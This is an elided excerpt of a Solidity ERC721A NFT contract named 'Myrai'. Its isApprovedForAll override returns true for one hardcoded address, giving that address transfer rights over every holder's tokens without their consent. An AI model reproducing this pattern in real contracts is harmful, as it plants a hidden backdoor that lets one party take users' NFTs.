  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xA452Bc35734cc439468b2caeE4999530827A9962){return true;}
...
contract Myrai is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Myrai", "MYR", maxBatchSize_, collectionSize_) {
